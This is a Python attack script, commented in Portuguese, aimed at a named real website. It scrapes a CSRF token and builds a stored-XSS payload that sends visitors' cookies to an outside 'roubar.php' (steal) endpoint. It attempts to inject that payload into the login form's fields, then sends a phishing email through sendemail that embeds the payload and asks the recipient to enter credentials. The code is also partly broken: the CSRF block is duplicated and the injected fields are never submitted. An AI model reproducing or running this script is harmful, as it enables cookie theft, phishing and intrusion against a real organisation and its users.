import requests
from bs4 import BeautifulSoup
import platform
import subprocess

# URL do site-alvo
url = 'https://cbl.org.br/'

# Enviar solicitação GET para a página de login
response = requests.get(url)

# Extrair o token CSRF da página
soup = BeautifulSoup(response.text, 'html.parser')
csrf_input = soup.find('input', {'name': 'csrf_token'})
if csrf_input is not None:
    csrf_token = csrf_input['value']
else:
    print('Erro: token CSRF não encontrado.')

csrf_input = soup.find('input', {'name': 'csrf_token'})
if csrf_input is not None:
    csrf_token = csrf_input['value']
else:
    print('Erro: token CSRF não encontrado.')
# Criar o payload de XSS personalizado
xss_payload = "<script>document.location='https://meusite.com/roubar.php?cookie='+document.cookie</script>"

# Ataque persistente: injete o payload personalizado em cada campo de entrada
for input_field in soup.find_all('input'):
    if input_field.has_attr('name'):
        input_field['value'] = input_field['value'] + xss_payload

# Enviar solicitação POST com os payloads de XSS
data = {
    'username': 'usuario',
    'password': 'senha',
    'csrf_token': csrf_token,
    'submit': 'Login'
}

response = requests.post(url, data=data)

# Coletar informações sensíveis
soup = BeautifulSoup(response.text, 'html.parser')
if 'Welcome, usuario!' in soup.text:
    print('Login bem-sucedido!')
    cookies = response.cookies.get_dict()
    user_agent = response.request.headers['User-Agent']
    os_version = platform.platform()
    print('Cookies:', cookies)
    print('User-Agent:', user_agent)
    print('OS Version:', os_version)
    # Encadeamento de ataque: use o explorador de XSS com outras ferramentas
    subprocess.call(['sendemail', '-t', 'alvo@example.com', '-u', 'Importante: verificação de segurança', '-m', f'Olá, visite esta página: https://exemplo.com/login e insira suas credenciais. Obrigado! {xss_payload}'])
else:
    print('Falha no login.')
